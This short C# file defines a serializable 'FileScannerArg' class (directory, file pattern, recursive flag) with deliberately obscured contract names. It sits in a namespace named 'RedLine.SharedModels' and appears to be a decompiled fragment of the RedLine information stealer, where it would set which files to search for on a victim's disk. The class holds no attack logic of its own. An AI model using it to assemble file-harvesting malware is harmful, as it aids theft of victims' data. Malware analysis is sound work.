using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity16", Namespace = "Entity")]
public class FileScannerArg
{
	[DataMember(Name = "Id1")]
	public string Directory { get; set; }

	[DataMember(Name = "Id2")]
	public string Pattern { get; set; }

	[DataMember(Name = "Id3")]
	public bool Recoursive { get; set; }
}
